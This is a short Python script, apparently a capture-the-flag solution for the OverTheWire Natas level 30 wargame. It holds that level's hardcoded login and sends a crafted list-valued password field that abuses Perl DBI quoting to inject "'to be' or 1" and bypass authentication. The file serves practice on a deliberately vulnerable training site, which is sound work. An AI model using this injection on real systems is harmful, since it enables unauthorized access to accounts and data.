# Natas30 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas30.natas.labs.overthewire.org/"

auth_name = 'natas30'
auth_pass = 'wie9iexae0Daihohv8vuu3cei9wahf0e'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# PERL comparisons can be just as fun as PHP
DATA = dict(username="natas31",password=["'to be' or 1",5])

r = s.post(URL, data=DATA)

for x in r.iter_lines():
    if "win" in x:
        print x